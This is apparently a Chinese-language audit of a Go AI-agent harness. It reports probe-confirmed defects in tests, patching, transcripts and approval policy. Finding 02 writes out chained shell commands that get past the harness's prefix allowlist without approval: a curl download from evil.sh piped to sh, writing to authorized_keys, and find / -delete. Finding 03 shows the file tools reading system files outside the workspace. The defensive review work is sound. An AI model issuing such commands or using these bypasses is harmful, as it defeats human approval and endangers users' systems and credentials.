simple-harness

分层清晰、ADR 纪律扎实的Go agent harness。核心问题不在结构，而在边界执行力—— 十个缺陷已用可执行探针证实：go test ./... 当前完全不可用， apply_patch 会静默改错文件位置，一次超大工具输出会让会话永久无法打开。

总体判断

这个项目的架构骨架是好的：ADR 驱动的决策留痕、无状态 agent + per-call RuntimeContext 的设计、middleware 洋葱链的注释质量，都超出同规模项目的常见水平。 config 包95.3% 覆盖率、go vet 与 -race 全绿，说明基础工程习惯到位。

问题集中在一个模式上：设计意图写在注释里，但没有被代码或类型强制。 shell 白名单意在放行只读命令，实际用前缀匹配一放到底； transcript 写侧刻意"尽力而为"、读侧却要求逐行完美，两个各自合理的决定合起来能永久锁死会话。 文档说得越清楚、代码越没兜住，未来维护者越容易误信注释。

分层结构本身可以放心继续扩展：底层三包零内部依赖， 依赖方向基本符合自述顺序（两处倒置只是取一个类型，挪动即可）； 无状态 agent + per-callRuntimeContext 让"共享 chain 并发安全"成为结构性保证而非约定。 唯一需要在下一阶段一并考虑的设计问题是审批授权粒度（见"设计层面"一节）—— 它与规划中的 workspace 耦合，补实现补不出来。

以下 10 项已通过可执行探针验证（非静态推测），探针已全部清理，工作区保持干净。 上下文管理与 workspace 边界为作者已规划、下一阶段实施的内容，不计为设计错误。

01
阻断 测试基建 internal/e2e/e2e_test.go

全部 5 个 TUI e2e 测试确定性挂死，go test ./... 不可用

termtest.SendLine 在 macOS/Linux 追加 \n（LF），而 bubbletea 把 LF 映射为 ctrl+j，enter 对应的是 \r（CR）。 结果输入被打进输入框却永不提交——终端快照里能看到"你好"静静躺在 MESSAGE 框内。 进程随后卡死到 PTY 读超时，最终整个测试二进制被强杀（exit 137）。

这不是 flaky，而是确定性失败，且影响的是整类测试： TestTUIInteractiveE2E、TestTUIApprovalE2E、TestTUIResumeE2E、 TestTUIExitsE2E 全部用 SendLine。CLAUDE.md 推荐的 go test ./... 因此在当前环境必挂。

对照实验 ·同一测试仅改行尾--- PASS: TestProbeCRvsLF/CR_回车 (0.28s) --- FAIL: TestProbeCRvsLF/LF_换行（SendLine 现状） (8.58s) ← 超时

修法：把 e2e 里的 cp.SendLine(x) 换成 cp.SendUnterminated(x + "\r")， 建议包一层 sendKeys() 辅助，避免以后再踩。

02
安全 internal/middleware/impl/policy.go:77-130

shell 白名单前缀匹配可绕过，破坏性命令免审批放行

isSafe() 用 strings.HasPrefix 匹配 safeCommandPrefixes， 只看命令开头，不理解 shell 语法。任何以白名单词开头的命令行——无论后面接了什么——都被判为"只读安全"直接放行。 7 个测试命令里 6 个在 acceptedit 模式下无需审批即可执行。

Decide(cmd, ModeAcceptEdits, nil) 实测find / -delete → ★放行（无审批） cat /etc/passwd → ★放行（无审批） echo pwned > ~/.ssh/authorized_keys→ ★放行（无审批） ls && curl http://evil.sh -o /tmp/x && sh /tmp/x → ★放行（无审批） env; python3 -c 'shutil.rmtree(...)' → ★放行（无审批） grep x /dev/null; rm -rf /tmp/victim → 询问 ← 仅此一条被黑名单拦住

注意最后一条之所以被拦，是因为 rm -rf 命中了黑名单子串，而非白名单判对了。 换成 find / -delete 这种不含黑名单词的破坏性命令，就直接穿过去了。

修法：白名单判定前先拒绝含shell 元字符的命令行（; | & > < $( ` && ||）， 只对"单一简单命令"应用前缀白名单。这比引入 tree-sitter 便宜得多，且能堵住上面全部案例。

03
安全 边界缺失 internal/tools/fs.go · write_file.go · apply_patch.go

全部 5 个文件工具无 workspace 边界，readonly 模式形同虚设

read_file / list_dir / glob / write_file / apply_patch 都把模型给的路径直接交给 os 调用， 没有路径规范化、没有 workspace 前缀校验、没有 ../穿越检查。 grep -rn "state.CWD\|filepath.Abs\|filepath.IsAbs" internal/tools/ 在全部工具里零命中。

实测 · 直接调用各工具的 Handle（rc 传 nil）read_file /etc/hosts → ★成功，读到 4113 字节 list_dir /etc → ★成功，列出 76 项 glob /etc/*.conf → ★成功，/etc/asl.conf /etc/autofs.conf … read_file ../../../../../etc/hosts → ★成功，路径穿越未被拦 write_file /tmp/… → ★成功 rc 传 nil 也全部正常工作 —— 工具根本不消费 rc.State.CWD

与审批策略叠加后后果被放大：classify() 把 read类工具归为 classRead， Decide 在任何模式下都对它返回 OutcomeAllow（policy.go:193-195）。 也就是说最严格的 readonly 模式下，模型仍可无审批读取 /etc/passwd、~/.ssh/id_rsa、任意绝对路径。 "只读"限制的是写，不是读的范围——但用户会理解成后者。

修法：加一个 resolveInWorkspace(rc, path) 公共辅助（filepath.Abs + state.CWD 为基 + 前缀校验），所有文件工具走它。这同时让 state.CWD 这个死字段变活。

正确性 UI 契约 internal/config/resolve.go:25-35

Controller.Models()（command.go:78-91）遍历所有 provider 收集模型名给弹窗， 但 config.Resolve 只在 default_provider 内查找模型（先定provider，再在其 Models 里找）。选中非默认 provider 的模型 → SetModel 调Resolve 报 not found。

06
健壮性 internal/session/transcript.go:89 · internal/tools/shell.go:65

两处生命周期缺口：写后关panic、超时不杀进程组

（a） TranscriptWriter.Write 直接 w.ch <- line， Close 里 close(w.ch)。Close 之后任何一次 AddUser/AddCommand/OnAgentEvent 都会 panic 崩掉整个进程——而 Close 幂等（closeOnce）恰恰暗示了 "可能被多路径调用"的设计预期。Flush 同样中招。

实测Write-after-Close → panic: send on closed channel Flush-after-Close → panic: send on closed channel

（b） shell 工具用 exec.CommandContext，超时只杀 sh 本身，不杀进程组。命令若派生后台进程（nohup ... &、 npm run dev &），孤儿进程会残留。

实测：600ms 超时 + nohup sleep 41err=signal: killed ctxErr=context deadline exceeded *** 孤儿进程残留：26527?? 0:00.00 sleep 41 ***

修法（a）：给 writer 加 closed 标志 + RWMutex，关闭后 Write 静默丢弃而非 panic。 修法（b）：SysProcAttr{Setpgid: true} +超时时 syscall.Kill(-pgid, SIGKILL)。

07
数据损坏 internal/tools/apply_patch.go:206-272

apply_patch 会静默改错位置，且失败后不回滚

（a）首次匹配即改，无歧义检测。 findSubsequence（apply_patch.go:258）线性扫描取第一个匹配的位置， 不检查文件里是否存在多处同样的片段。而 @@ 定位行——模型用来消除歧义的唯一手段—— 在 parseHunks:206-209 被直接 continue 丢弃 （代码注释 apply_patch.go:22 也承认"v1 忽略内容仅作分隔"）。

后果是：文件里有重复片段时（同构的错误处理、相似的 getter、重复的 return err）， 模型想改后面那处，实际改了前面那处，且返回 success。 模型和用户都不会收到任何警告。

实测· 文件含两个同构函数，补丁意图改 second() 1: func first() error { 2: err := doA() 3: return fmt.Errorf("second: %w", err) ← 改到了 first() 里 4: } 5: 6: func second() error { 7: err := doB() 8: return err ← 模型真正想改的这行没动 9: } applyPatch 返回 err=<nil>，工具结果 Success=true

（b）多操作补丁无事务性。 applyPatch:78-96 顺序执行 ops，任一失败即 return， 不回滚已完成的操作。模型收到"失败"，磁盘却已被部分修改； 且因为 applyAdd 对已存在文件报错（apply_patch.go:156-158）， 模型原样重试会撞上"文件已存在"，陷入无法自行恢复的状态。

实测 · 补丁含 Add File + Update File（后者路径不存在）applyPatch 返回 err=Update File .../does-not-exist.txt: no such file 但 new.txt 已被创建（内容="created\n"）—— 无回滚

修法（a）：findSubsequence 改为找全部匹配， 多于一处时返回"歧义"错误并把候选行号回填给模型；同时把 @@ 的定位文本用作匹配起点的过滤。这比引入完整 diff 库便宜，且直接消除静默错改。 修法（b）：先把全部 ops 解析并校验（文件存在性、hunk 可匹配性）再统一落盘， 或对涉及的文件先备份内容、失败时恢复。

数据丢失 internal/session/load.go:38,61,65-67

一次超大工具输出或一行写坏，会话永久无法 resume

loadHistoryFile 用bufio.Scanner 且缓冲上限 4MB （load.go:38 与 61各一处），单行超限直接 ErrTooLong； JSON 解析失败则 return nil, fmt.Errorf("bad line")（load.go:65-67）—— 不跳过、不降级、不保留前面已读到的完好行。

这条路径在实践中可达，因为 transcript 存的是未截断的工具结果： emit(EventToolResult) 在 tool.Handle 返回后立刻发出（agent.go:281）， 而 ToolOutputMiddleware 的 20KB 截断发生在 next() 返回之后 改写 rc.Messages（tool_output.go:83-94）。 也就是说 conversation 被截断到 20KB，transcript 却忠实记下全量。 一条 shell_command 吐出 4MB 以上输出（cat 一个大文件、 一次啰嗦的构建日志），该会话此后永久打不开。

实测 · 构造 transcript含 5MB 合法 JSON 行 + 后续正常 user 行: LoadConversation → err = bufio.Scanner: token too long LoadLines → 0 行（后面那条完好的 user 行也读不到） 含一行崩溃截断的半个 JSON: LoadConversation → err = bad line: unexpected end of JSON input 前面完好的行被一并丢弃

更糟的是 TUI 会掩盖这个故障：loadSessionHistory 在 TranscriptLines() 报错时静默回退到 conversation 渲染（tui/run.go:42-48）， 用户看到一个"正常打开但内容不全"的会话，而不是一条错误信息。

根因是写读不对称：写侧几乎所有落盘错误都被静默丢弃 （transcript.go:163-168 的 json.Marshal 与 file.Write、 149-152 的切段失败），读侧却要求"逐行完美 JSON 且每行 < 4MB"。 修法：读侧改为跳过坏行并计数上报（bufio.Reader 替代 Scanner 以免行长限制）， 写侧对超大content 先落 evictions/ 再在 transcript 里记指针。

竞态 internal/ui/tui/run.go:32 · internal/session/transcript.go:90

回合进行中收到 SIGTERM，writer 写后关 panic 变为可达

第 06 项证实了 Write/Flush 在 Close 后会 panic。 单看主路径它不可达（runCmd 的 defer sess.Close() 排在 <-runDone 之后；/exit 只在 !m.running 时生效）。 但 TUI 有一条真实竞态路径：

路径resumeCmd: signal.NotifyContext(ctx, SIGTERM) (resume.go:82) ↓ program用 tea.WithContext(ctx) (tui/run.go:29) SIGTERM 到达 → program.Run() 因 ctx 取消而返回 ↓ defer controller.CloseAll() 关闭 writer (tui/run.go:32) 但 agent run goroutine 从未被等待，仍在运行 ↓ 它的 ctx 也被取消 → emit EventError (agent.go:138/146) ↓ controller.onEvent → active.OnAgentEvent (controller.go:84-89) ↓ w.Write → panic: send on closed channel

同一竞态还有第二种触发方式：channel 缓冲（256）满时生产者阻塞在 w.ch <-， 此时 close(w.ch) 同样让阻塞中的发送者 panic。 closeOnce 只保证 Close 自身幂等，管不了 Close 与并发 Write 的关系。

修法：RunTUI 在CloseAll 前等待 run goroutine 退出， 外加 writer 侧的 closed 标志兜底（两者都要，前者治因后者治症）。

状态建模 internal/ui/tui/popup.go:130 · model.go:532-544

覆盖层无优先级建模，审批未决时队列命令可开出第二层弹窗

三个覆盖层字段 appr（审批）/ sel（选择弹窗）/ help 可同时为真。互斥性只由两处顺序隐式保证：渲染看 modalArea 的 switch（view.go 内appr > sel > help），按键看 handleKey 开头的 if 链（model.go:202-208）。openPopup（popup.go:130） 没有 if m.appr != nil 守卫。

按键通道其实是安全的——我实测 appr != nil 时 handleApprovalKey 拦下了包括 enter 在内的所有按键，用户无法在审批挂起时手动开弹窗。 真正的通道是队列消费：回合期间输入的 /help 进队列， handleRunDone 在回合结束时直接调 handleInput 执行它， 完全不检查 appr 状态。

实测 · appr 挂起 + 队列含 /help，触发 runDoneMsghandleRunDone 后: appr=true sel=false help=true ← 两个overlay 并存 View() 渲染: 审批框=true 帮助框=false ← help 被 appr 遮住 用户答完审批(y/s/n) → appr 清空 → help 突然浮现 一个他早已"发出"却从未见过的命令

后果是 UX 错乱而非崩溃，但根因值得修：把三个字段收成一个 overlay 单字段（带kind 的 tagged union），非法组合就不可表达， 渲染与按键分发也各自只剩一处判断。

依赖方向 2 处倒置

两处底层包引用上层包。均不构成编译期循环（我核对了两侧的import）， 但方向是倒的，会阻碍后续拆分与复用。

tools → middleware/impl

shell.go:14 为了 impl.EvictContent（截断+落盘）而import 中间件实现包。 工具是叶子能力，却依赖了一个 middleware 的具体实现。EvictContent 本质是通用的 "超长内容落盘+预览"工具函数，和 middleware 无关——挪到 internal/evict 或 internal/middleware（契约层）即可，两边都能引。

session → agent

transcript.go:12 与 session.go:11 为了 agent.Event 类型而 importagent。持久化层依赖编排层的事件枚举，意味着 transcript 格式被 agent 的事件定义绑住，且 session 无法在不引入 agent 的场景下复用。 更顺的方向：事件类型下沉到 messages 或独立 events 包， 或让 session暴露自己的 Line 写入 API，由 cmd 层做转换。

失效的设计意图 注释与代码不一致

state.CWD 是死字段

agentstate.go:28 定义、session.go:33-35 用三行注释解释它的语义 （"会话启动目录，resume 后模型可知会话从哪启动"）、每次落盘都写它—— 但全仓库没有任何代码读取它。 shell_command 的工作目录来自模型传的 workdir 参数， 文件工具没有 base 目录概念。 ADR-028 想解决的"resume 后 cwd 漂移"问题实际并未解决：resume 时进程 cwd 是用户当前所在目录， 与会话原始目录无关，而工具全都跟随进程 cwd。

ContextWindow 解析后无人消费（已规划，下一阶段）

config.Resolve 认真解析 context_window（含默认回退）， providerBase 提供 getter，但除了这个 getter 自己没有调用点。 agent.Run 的 for {} 循环（agent.go:135）既无轮次上限，也无 token 预算检查； stop_reason 在anthropic_stream.go 里完全没有被读取， max_tokens 截断会静默发生（正是 anthropic.go:42-45 注释里描述过的那个坑）。 上下文超限时的行为取决于 API 报错，harness 层没有保护。

定性说明：上下文管理（compact）与 workspace 边界均为作者已规划、下一阶段实施的内容， 属已知未实现，不计为设计错误。此处记录仅为标注当前状态： 在这两层补上之前，现有架构尚未经过长会话的真实压力检验。 state.CWD 成为死字段同理——它是 workspace 尚未落地的表现，而非疏漏。

无重试与退避

grep -rn "retry\|backoff" 在 provider / agent / cmd 全线零命中。 429与 5xx 直接冒泡成EventError 终止回合。对一个"可真实使用"的 harness， 这是最容易被用户感知的健壮性缺口。

设计层面 需在下一阶段一并考虑

与前述缺陷不同，这一条不是"忘了写校验"，而是权限模型缺少一个维度—— 补实现补不出来，需要改 Decide 的输入契约。之所以单列，是因为它与 规划中的 workspace 有耦合：workspace 落地时若不一并考虑，会先做出一个只有硬边界的版本，回头再拆开加。

审批授权粒度：决策只看工具名，不看这次调用要碰什么

Decide（policy.go:180）的可见信息只有三样：工具名、当前模式、会话已批准列表。 它拿到 call 后第一步是 classify(call.Name) 把工具名映射成四类， 然后 read 与 todo 类在任何模式下直接放行：

policy.go:193-195· 决定只由工具名做出case classRead, classTodo: return OutcomeAllow, "" ← call.Args 里的 path 从未被读取

对比同一函数里的 shell 分支，差异就很清楚——shell 是看参数的：

policy.go:201-210 · 同一函数，按参数内容决定case classShell: cmd := cmdOf(call) ← 解析参数 switch { case isDangerous(cmd): ... ← 按内容判定 case isSafe(cmd):...

所以问题不是"Decide 拿不到参数"——call.Args 就在手里。 问题是 toolClass 这个抽象把"这个工具是什么"和"这次调用要碰什么"压成了同一个维度。 一旦某工具被归进 classRead，它的全部调用共享同一结论，参数不再有发言权。

结果是这个权限模型无法表达一句很基本的话：允许读项目内的文件，不允许读项目外的。 不是"尚未实现"，而是说不出来——Outcome 只有 Allow / Ask / Deny 三值，没有任何位置承载"在什么范围内 Allow"。

会话记忆继承了同一问题

ApprovalKey（policy.go:148-153）对非 shell 工具直接返回工具名：

policy.go:148-153if call.Name == "shell_command" { return NormalizeCommand(cmdOf(call)) ← shell：按命令内容 } return call.Name ← 其它：按工具名

于是用户在 readonly 下批准一次 write_file 并选"本会话记住"， 记住的是 "write_file" 这个字符串——此后本会话内写任何路径都不再询问。 用户同意的是"写这个文件"，系统记下的是"这个工具"。 这两件事在 shell 上被区分开了，在文件工具上没有。

与 workspace 的关系：加了 workspace 不会自动解决

假设下一阶段实现了路径边界，所有文件工具被限制在 workspace 内。那时越界访问会被工具层拒掉， 但 Decide 依然只看工具名、依然对所有 read 无条件 Allow。 workspace 于是成为一道硬边界：要么全允许，要么全拒绝，用户无法参与决定。

而审批系统的意义恰恰是处理"介于两者之间"的情形——workspace 内有个 .env， 或模型想读 workspace 外的某个配置文件而这次确实合理，用户看一眼就能判断。 两个机制解决的是不同问题：workspace 划定默认范围，审批负责范围之外交给人判断。 若 Decide 说不出"这次调用碰的是什么"，第二个机制在文件工具上就无法工作，只剩第一个。

修法

改动集中在一处：让分类结果携带"这次调用要碰的资源"。

方向示意// classify 不再只吃名字 type action struct { class toolClass target string // read/edit: 解析出的路径；shell: 命令；todo: 空 }

Decide 拿到 target 后，read 类即可从"无条件 Allow"变为 "在允许范围内 Allow、范围外 Ask"；ApprovalKey 也顺势能对文件工具返回 write_file:<路径>，让会话记忆的粒度与 shell 对齐。

Decide 是纯函数且有独立测试（policy_test.go），改动不触及 ApprovalMiddleware 与 agent loop，成本不高。 关键是要在 workspace 那一版设计里一起想，而非事后追加。

可维护性

TUIModel：33 个字段，7 个状态字段隐式编码状态机

model.go 693 行、view.go 612 行，ui/tui 单包 2,457 行 （占非测试代码的三分之一）。Model（model.go:89-129）有 33 个字段， 状态由 7 个字段隐式编码：running / turnDone / interrupted / eventError / help 五个 bool 加appr / sel 两个指针。第 10 项已证实其中一组非法组合可达。

字段本身内聚度不错，可直接按语义提取六个子结构： inputHistory/historyPos/draft/completion → composerState（内聚最高）； running/turnDone/interrupted/eventError → turnState（或干脆一个 turnPhase 枚举）； items/msgs/tools/stream → timelineData； width/height/mainTop/composerTop/contentWidth/renderWidth → layoutState（每帧由 layout() 重算）； appr/sel/help/toast/showThinking → overlayState； hits/selectedHit/autoScroll → timelineNav。 顺带一提，msgs 字段的注释自述是"direct index"，它可以从 items 过滤得出，属冗余缓存。

View 层宽度计算散落六处

maxInt(1, m.width) 的变体在 view.go 出现六次 （84 / 95 / 158 / 160 / 162 / 229），且语义各不相同（m.width、 m.width-4、m.width-2），与 interaction.go:25 的 contentWidth 属重复推导。列表选择器的渲染模式 （cursor 前缀 + 截断 + 选中高亮）在 popup.go:225-237 与 view.go:156-164 各写一遍，可提取 renderListRows(items, cursor, width)。 这解释了为什么 TestModalsFitPanelWidth 那类逐行宽度断言会存在—— 宽度没有单一来源，只能靠测试兜。

Chain 的 5 个 Wrap* 是同一段逻辑抄了 5 遍

chain.go:161-226：WrapAgent / WrapReasoning / WrapToolCall / WrapActing / WrapModelCall 除了 hook 名和 Input 类型外字节级同构（倒序循环 + inner := next 快照）。 注释质量很高（把闭包捕获陷阱讲得很透），但这份优秀注释只挂在第一个函数上， 后四个是"同WrapAgent"。新增第6 个 hook 就要再抄一遍。Go泛型可以收成一个 wrap[I any](mws, pick, core)。这是全仓库最明确的一处可无风险收敛的重复。

工具层参数解析样板

7 个内置工具各自手写 json.Unmarshal(args, &p) + 错误包装 （fs.go 三处、其余各一处），JSON Schema 全部手写字符串字面量。 加一个 parseArgs[T](name, args) (T, error) 泛型辅助可以消掉解析与错误包装的重复， 同时统一 ToolError 的措辞。

测试基建缺共享 helper

fakeTool 在 agent_test.go 与 tools_test.go 各定义一份； 测试配置模板在 app_test.go、e2e_test.go、main_test.go 各写一遍； newRC 构造散落在三个 middleware 测试文件里。 另外 tools 包测试固定耗时 3.5s（shell_test.go 用真实 sleep 3），agent_test.go:186 用 30ms sleep 制造并发窗口后断言 max>=2——慢机器上会偶发失败。

其余已核实的问题 未单列，但值得排期

AgentState 原子写用固定 tmp 名。 agentstate.go:121 是 tmp := path + ".tmp"，不含进程/随机后缀。 同一会话被两个进程同时打开（resume 同一 id 两次）时，两个 SaveFile 会写同一个临时文件再各自 rename，互相覆盖。 另外没有 fsync，rename 后断电仍可能丢内容。 修法：tmp := fmt.Sprintf("%s.%d.tmp", path, os.Getpid()) + 写完 f.Sync()。

transcript 行类型字符串三套各自维护。 写在transcript.go:98-111、读在load.go:68-86、 TUI 渲染在 tui/run.go:53-86，三处都是裸字符串字面量且 load 的 switch 没有 default——新增一种行类型会被静默吞掉， 不报错也不渲染。抽一组 const LineType… 到session 包即可。

resume 后 ordinal 与 turn 归零。 Resume 复用现有最大段并以 O_APPEND 打开（transcript.go:71-78）， 但 ordinal 从 0 重新自增、turn 也重置。 同一文件内 ordinal 因此重复，与 transcript.go:46 "resume 按序加载兜底"的注释不符。 实际影响有限（load 完全忽略 Ordinal，按物理行序重建）， 但这意味着注释承诺的排序兜底并不存在——字段是装饰性的。

工具 schema 与 Go struct 双份声明。 7 个工具的 JSON Schema 全部手写字符串（todo.go:44-62 嵌套 array/enum 写了 19 行）， 同时又有一份对应的 Go struct 用于解析——todo.go:66-67 的注释甚至自称"对偶结构"。 改一边忘改另一边不会报错。更糟的是 anthropic_messages.go:114 用 _ = json.Unmarshal(...) 静默吞掉 schema 语法错误，模型会收到一个空 schema。

thinking 不重放只靠单点"不读取"。 ADR-025 的约束仅由 anthropic_messages.go:45-47 不读 Thinking 字段实现， 没有任何测试断言重放请求里不含 thinking。且 thinking-only 的消息会被整条丢弃 （anthropic_messages.go:34-35）。这类"靠约定维持"的约束最容易在重构中失效。

双轨审计靠时序而非契约。 transcript 记全量、conversation 记截断，这个区分完全依赖 "emit 早于 ToolOutputMiddleware 的 after 改写"这一时序 （agent.go:281 对 tool_output.go:83-94）。代码里没有任何注释声明这层顺序依赖—— 谁把 emit 挪到 middleware 之后，审计完整性就悄悄没了。第 08 项的 resume 锁死正是这个设计的副作用。

做得好的地方

ADR 纪律

决策留痕到ADR-030，代码注释直接引用 ADR 编号。 contract.go:5-11 甚至解释了"为什么审批契约放middleware 而不放 impl"—— 正是为了避免 import 环。这种把架构约束的理由写进代码的做法，比结论本身有价值。

无状态 agent 的设计确实站得住

Agent 只持不可变配置，会话全经 rc 传入， middleware 实现（SessionMiddleware、ApprovalMiddleware）都是值类型无字段状态。 这让共享 chain 并发安全成为结构性保证而非约定，为后续并行 subagent 留好了路。 -race 在 agent/session/tui 三个包全绿印证了这点。

底层三包零内部依赖

config、messages、agentstate 都不import 任何 harness 内部包，agentstate 独立成包的理由（打破 middleware↔session 环） 写在包注释里。这是本项目分层最干净的部分，config 覆盖率 95.3% 也最高。

洋葱链与 pipeline 的语义区分清晰

5 个 onion hook 与 onSystemPrompt transformer pipeline 的差异 （套娃 vs 正序流水线）在 ComposeSystemPrompt 注释里讲明白了， 空链零开销透传的性质也点出来了。TodoReminderMiddleware 注入临时副本而非改 conversation，还特意注明"必须 copy 新 slice 否则写穿落盘"—— 这是踩过坑才会留的注释。
